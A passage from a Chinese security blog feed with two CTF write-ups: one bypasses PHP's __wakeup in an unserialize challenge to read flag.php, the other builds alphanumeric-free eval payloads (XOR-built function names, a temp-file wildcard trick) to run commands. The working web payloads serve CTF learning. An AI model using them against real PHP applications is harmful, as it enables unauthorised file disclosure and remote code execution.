class="comment">//但对象被当作字符串时触发</span></div><div class="line">__get<span class="comment">//访问不可访问的属性时触发</span></div><div class="line">...</div></pre></td></tr></table></figure><p><strong>具体看下面的例子</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</div><div class="line">  <span class="keyword">private</span> $a=<span class="string">"private"</span>;</div><div class="line">  <span class="keyword">protected</span> $b=<span class="string">"protected"</span>;</div><div class="line">  <span class="keyword">public</span> $c=<span class="string">"public"</span>;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__construct&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__destruct&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">"__toString&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__sleep&lt;/br&gt;"</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__wakeup&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($a)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__get&lt;/br&gt;"</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">$class=<span class="keyword">new</span> test();<span class="comment">//触发__construct,输出__construct</span></div><div class="line"><span class="keyword">echo</span> $class;<span class="comment">//触发__toString,输出__toString</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $class-&gt;a;<span class="comment">//访问私有属性$a,触发__get,输出__get</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">$str=serialize($class);<span class="comment">//触发__sleep,输出__sleep</span></div><div class="line"><span class="keyword">echo</span> $str;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">$new_class=unserialize($str);<span class="comment">//触发__wakeup,输出__wakeup</span></div><div class="line"><span class="comment">//程序结束对象被销毁,触发//destruct,输出__destruct,输出两次，分别销毁$class和$new_class两个对象</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>该程序的输出结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/181031/iGL0DDG152.png?imageslim" alt="mark"><br><strong>需要注意的是<code>private</code>、<code>protected</code>、<code>public</code>三个对象的属性经过序列化后的字符串格式是有区别的，这在构造POC的时候十分关键，通过抓包看到的序列化数据实际如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">"\00test\00a"</span>;s:<span class="number">7</span>:<span class="string">"private"</span>;s:<span class="number">4</span>:<span class="string">"\00*\00b"</span>;s:<span class="number">9</span>:<span class="string">"protected"</span>;s:<span class="number">1</span>:<span class="string">"c"</span>;s:<span class="number">6</span>:<span class="string">"public"</span>;&#125;</div><div class="line">\\<span class="keyword">private</span>属性序列化后:数据类型:属性名长度:<span class="string">"\00类名\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">\\<span class="keyword">protected</span>属性序列化后:数据类型:属性名长度:<span class="string">"\00*\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">\\<span class="keyword">public</span>属性序列化后:数据类型:属性名长度:<span class="string">"属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div></pre></td></tr></table></figure><p><strong>其中常见的php数据类型对应的字母标识如下</strong></p><pre><code>a - arrayb - booleand - doublei - integero - common objectr - references - non-escaped binary stringS - escaped binary stringC - custom objectO - classN - nullR - pointer referenceU - unicode string</code></pre><p><strong>接着看上面的那道题,代码很明显存在php反序列化漏洞,题目要求利用php反序列化漏洞去读取与<code>index.php</code>同一目录下的<code>flag.php</code>,代码流程很简单,就是将传入的<code>$_GET[&#39;file&#39;]</code>参数经过base64解码后再进行反序列化,如果处理结果是该对象的一个序列化字符串,在进行反序列化的时候就会触发该对象的<code>__wakeup</code>方法,并在代码结束时触发该对象的<code>__destruct</code>方法,此时对象当中的<code>$file</code>变量被传入<code>show_source</code>,如果<code>$file</code>是一个文件名,就会显示出对应文件的源代码,<code>$file</code>变量又刚好是可控的,很容易构造出读取<code>flag.php</code>的payload</strong></p><p><strong>构造序列化字符串,设置对象的<code>protected</code>属性$file的值为<code>flag.php</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</div></pre></td></tr></table></figure><p><strong>再经过base64编码</strong></p><pre><code>Tzo1OiJTb0Z1biI6MTp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9</code></pre><p><strong>将得到的base64字符串传入<code>$_GET[&#39;file&#39;]</code>,但是看到并没有显示出<code>flag.php</code>的源码,这里依旧显示的是<code>index.php</code>的源代码,原因就是传入的序列化字符串在反序列化的时候会触发对象的<code>__wakeup</code>魔术方法,而在<code>__wakeup</code>魔术方法中,将传入的<code>$file</code>属性值设置成了<code>index.php</code>,之后触发<code>__destruct</code>方法时,<code>$file</code>的值就变为了<code>index.php</code>,所以这里需要绕过<code>__wakeup</code>函数,这里需要利用<code>__wakeup</code>函数的一个漏洞</strong></p><h3 id="wakeup-函数漏洞"><a href="#wakeup-函数漏洞" class="headerlink" title="wakeup()函数漏洞"></a>wakeup()函数漏洞</h3><p><strong>当序列化字符串当中属性个数值大于实际的属性个数时,就会导致反序列化异常,从而跳过<code>__wakeup</code>函数,具体的底层原理可以看下面的解释</strong><br><img src="http://pic.c1imber.top/blog/181031/J0bm2IaaCc.png?imageslim" alt="mark"></p><p><strong>那么就可以构造序列化字符串</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</div></pre></td></tr></table></figure><p><strong>将对象属性的个数设置为2,而实际的属性个数为1,使其反序列化产生异常,从而绕过<code>__wakeup</code>函数，将序列化字符串进行base64编码后</strong></p><pre><code>Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</code></pre><p><strong>成功读取到了<code>flag.php</code>的源码</strong><br><img src="http://pic.c1imber.top/blog/181031/hIkKA7Ag38.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PHP反序列化漏洞学习-绕过-wakeup-函数&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞学习-绕过-wakeup-函数&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞学习-绕过_wakeup()函数&quot;&gt;&lt;/a&gt;PHP反序列化漏洞学习-绕过_wakeup()函数&lt;/h1&gt;&lt;h3 id=&quot;题目代码&quot;&gt;&lt;a href=&quot;#题目代码&quot; class=&quot;headerlink&quot; title=&quot;题目代码&quot;&gt;&lt;/a&gt;题目代码&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;代码如下，要求利用php反序列化漏洞去读取&lt;code&gt;flag.php&lt;/code&gt;文件中的内容&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SoFun&lt;/span&gt;&lt;/span&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; $file=&lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!&lt;span class=&quot;keyword&quot;&gt;empty&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file)) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strchr(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt; file,&lt;span class=&quot;string&quot;&gt;&quot;\\&quot;&lt;/span&gt;)===&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt; &amp;amp;&amp;amp;  strchr(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file, &lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;)===&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          show_source(dirname (&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;).&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt; -&amp;gt;file);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;      &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Wrong filename.&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__wakeup&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123; &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt; file=&lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;; &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__toString&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; ;&amp;#125;&amp;#125;     &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;file&#39;&lt;/span&gt;]))&amp;#123; show_source(&lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;); &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       $file=base64_decode( $_GET[&lt;span class=&quot;string&quot;&gt;&#39;file&#39;&lt;/span&gt;]); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; unserialize($file ); &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;#&amp;lt;!--key in flag.php--&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="代码审计" scheme="https://c1aysec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://c1aysec.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>记一次ctf极限利用-不包含数字字母的webshell</title>
    <link href="https://c1aysec.github.io/2018/10/08/%E8%AE%B0%E4%B8%80%E6%AC%A1ctf%E6%9E%81%E9%99%90%E5%88%A9%E7%94%A8-%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"/>
    <id>https://c1aysec.github.io/2018/10/08/记一次ctf极限利用-不包含数字字母的webshell/</id>
    <published>2018-10-08T03:22:03.000Z</published>
    <updated>2019-11-08T15:01:19.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次ctf极限利用-不包含数字字母的webshell"><a href="#记一次ctf极限利用-不包含数字字母的webshell" class="headerlink" title="记一次ctf极限利用-不包含数字字母的webshell"></a>记一次ctf极限利用-不包含数字字母的webshell</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>问题来自于同事给我一道安恒的ctf赛题，题目代码如下</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include <span class="string">'flag.php'</span>;</div><div class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'code'</span>]))&#123;</div><div class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">'code'</span>];</div><div class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;35)&#123;</div><div class="line">        die(<span class="string">"Long."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,<span class="variable">$code</span>))&#123;</div><div class="line">        die(<span class="string">"NO."</span>);</div><div class="line">    &#125;</div><div class="line">    @<span class="built_in">eval</span>(<span class="variable">$code</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    highlight_file(__FILE__);</div><div class="line">&#125;</div><div class="line">//<span class="variable">$hint</span> =  <span class="string">"php function getFlag() to get flag"</span>;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><a id="more"></a><p><strong>看到这个题目后我的最先思路是想办法去执行getFlag这个函数去得到flag，于是想到可以利用php当中两个字符异或后可以得到另外字符这一个特性，将不为数字字母的字符异或后得到想要的字符,首先将所有可能性打印出来</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="variable">$a</span>=array(<span class="string">'!'</span>,<span class="string">'"'</span>,<span class="string">'#'</span>,<span class="string">'$'</span>,<span class="string">'%'</span>,<span class="string">','</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>,<span class="string">"'"</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'.'</span>,<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">'-'</span>,<span class="string">'/'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'^'</span>,<span class="string">'_'</span>,<span class="string">'`'</span>,<span class="string">'&#123;'</span>,<span class="string">'|'</span>,<span class="string">'&#125;'</span>,<span class="string">'~'</span>,<span class="string">':'</span>,<span class="string">';'</span>,<span class="string">'&lt;'</span>,<span class="string">'='</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'@'</span>);</div><div class="line">foreach (<span class="variable">$a</span> as <span class="variable">$v1</span>) &#123;</div><div class="line"> foreach (<span class="variable">$a</span> as <span class="variable">$v2</span>) &#123;</div><div class="line"> <span class="variable">$r</span>=<span class="variable">$v1</span>^<span class="variable">$v2</span>;</div><div class="line"> <span class="built_in">echo</span> <span class="variable">$r</span>.<span class="string">'='</span>.<span class="variable">$v1</span>.<span class="string">'^'</span>.<span class="variable">$v2</span>;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>经过测试得到：</strong></p><pre><code>g=&apos;^@e=[^&gt;t=]^)F=`^&amp;l=@^,a=!^@g=&apos;^@&quot;&apos;[]`@!&apos;&quot;^&quot;@&gt;)&amp;,@@&quot;=getFlag</code></pre><p><strong>接下来利用php的可变变量特性构造payload</strong></p><pre><code>$_=&quot;&apos;[]`@!&apos;&quot;^&quot;@&gt;)&amp;,@@&quot;;$_();</code></pre><p><strong>传入后最终变为：</strong><br>    eval(getFlag())</p><p><strong>但是这道题的正则也过滤了<code>$</code>和<code>_</code>,导致自己的这个思路受到了一些限制，后来自己又看了<a href="https://www.anquanke.com/post/id/160582?from=singlemessage#h2-2" title="一叶飘零师傅的解法" target="_blank" rel="external">一叶飘零师傅的解法</a>，思路是可以利用反引号执行命令将flag文件读取出来，加上利用linux当中<code>?</code>这个通配符就可以达到不使用数字字母与<code>$_</code>就可以获取flag的目的，但是由于<code>?</code>这个通配符是匹配任意字符的，导致结果当中会出现很多垃圾数据，而且我用这个方法得到的结果并不完整，不知道是哪里出了问题</strong></p><p><strong>于是自己向p牛小密圈发起了求助，经过p牛和小密圈大佬们的指点，得到了很多思路和有趣的知识点，在这里将自己学到的记录分享一下</strong></p><p><strong>首先，需要考虑到php5和php7的一些差异，php7当中已经可以使用<code>(函数名)()</code>这样的格式去执行一些动态函数了，所以这道题如果放到php7环境当中的话，就会比较好解，利用上面所说的那个特性就可以达到执行函数的目的，以执行phpinfo函数为例，构造payload：<code>(&quot;\(\@@&amp;/&quot;^&quot;,@,).@@&quot;)();</code>,将payload传入get参数code即可,注意一点，为了避免特殊符号影响，需要将payload进行url编码</strong><br><img src="http://pic.c1imber.top/blog/181008/4DI2B9H38I.png?imageslim" alt="mark"></p><p><strong>如果是php5的话，目前暂时还没有找到不使用数字字母和<code>$_</code>这些符号就可以执行动态函数去读取flag的方法，在这里需要使用执行命令的方法，但是需要避免无关的垃圾数据，经过p牛师傅的指点get到了一个很棒的思路：可以通过构造一个文件上传的数据包，通过文件上传可以在服务器的tmp目录下生成一个上传的php临时文件，文件的内容为要执行的命令，这个临时文件的生命周期就在php代码执行的期间，php代码执行结束就会自动删除，这样的话就可以在上传文件的同时传入GET参数去执行这个临时文件里面的命令，这里包含了几个知识点：</strong></p><pre><code>1.有关linux glob通配符的知识点：linux当中可以使用glob通配符匹配任意文件名，？可以匹配任意一个字符，[]里面可以通过ascii码指定匹配的字符范围2.linux当中可以使用.去执行任意文件，即使这个文件没有x执行权限3.php的短标签&lt;?=?&gt;相当于&lt;?php echo?&gt;的作用</code></pre><p><strong>知道了上面的几个点，就可以构造出来不含数字字母<code>$_</code>又可以执行命令的payload</strong></p><pre><code>code=?&gt;&lt;?=`. /???/????????[@-[]`?&gt;</code></pre><p><strong>因为文件长度为<code>/???/?????????</code>的文件有很多，为了避免匹配不到临时文件，这里将文件名的最后字母变为大写，其中<code>@-[</code>之间的ascii码为<code>A-Z</code></strong></p><p><strong>最终的执行结果，当生成的临时文件最后一个字母为大写时，就可以匹配到临时文件执行里面的命令</strong></p><p><img src="http://pic.c1imber.top/blog/181009/1FhGDakc26.png?imageslim" alt="mark"></p><h3 id="我所遇到的一些问题"><a href="#我所遇到的一些问题" class="headerlink" title="我所遇到的一些问题"></a>我所遇到的一些问题</h3><p><strong>我在做这道题的时候遇到了一些问题：自己一开始并不能成功的匹配到php产生的临时文件，最后得到了一个结论：有的linux操作系统和版本并不支持使用<code>[]</code>去匹配指定范围的ascii码，导致不能成功的匹配到php产生的临时文件，于是执行了其它的文件，自然就会失败。我测试的几个操作系统结果如下</strong></p><pre><code>docker centos6（成功）虚拟机 centos6（失败）vps centos7（失败）虚拟机ubuntu16.04（失败）vps ubuntu16.04(失败)</code></pre><p><strong>在这些linux当中，ubuntu里面的shopt是有一个<code>globasciiranges</code>选项的，这个配置项默认并没有开启所以会导致<code>[]</code>不能使用，使用<code>shopt -s globasciiranges</code>命令开启这个选项后就可以成功利用了</strong></p><p><strong>但是centos里面并没有<code>globasciiranges</code>这个配置项，所以暂时还不能成功利用（除了docker的centos6），这里应该就是和linux版本有关系了，最后为了方便理解，附上我的测试截图</strong></p><p><strong>centos7 vps</strong><br><img src="http://pic.c1imber.top/blog/181009/Bc3J9D8c50.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/181009/KAlLeIahBe.png?imageslim" alt="mark"></p><p><strong>ubuntu将shopt里面的<code>globasciiranges</code>开启就能解决问题</strong><br><img src="http://pic.c1imber.top/blog/181009/Fc1Cd2lEbK.png?imageslim" alt="mark"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><strong><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="external">无字母数字webshell之提高篇</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;记一次ctf极限利用-不包含数字字母的webshell&quot;&gt;&lt;a href=&quot;#记一次ctf极限利用-不包含数字字母的webshell&quot; class=&quot;headerlink&quot; title=&quot;记一次ctf极限利用-不包含数字字母的webshell&quot;&gt;&lt;/a&gt;记一次ctf极限利用-不包含数字字母的webshell&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;问题来自于同事给我一道安恒的ctf赛题，题目代码如下&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?php&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;include &lt;span class=&quot;string&quot;&gt;&#39;flag.php&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(isset(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;code&#39;&lt;/span&gt;]))&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;variable&quot;&gt;$code&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;code&#39;&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strlen(&lt;span class=&quot;variable&quot;&gt;$code&lt;/span&gt;)&amp;gt;35)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        die(&lt;span class=&quot;string&quot;&gt;&quot;Long.&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&quot;/[A-Za-z0-9_$]+/&quot;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$code&lt;/span&gt;))&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        die(&lt;span class=&quot;string&quot;&gt;&quot;NO.&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    @&lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$code&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    highlight_file(__FILE__);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//&lt;span class=&quot;variable&quot;&gt;$hint&lt;/span&gt; =  &lt;span class=&quot;string&quot;&gt;&quot;php function getFlag() to get 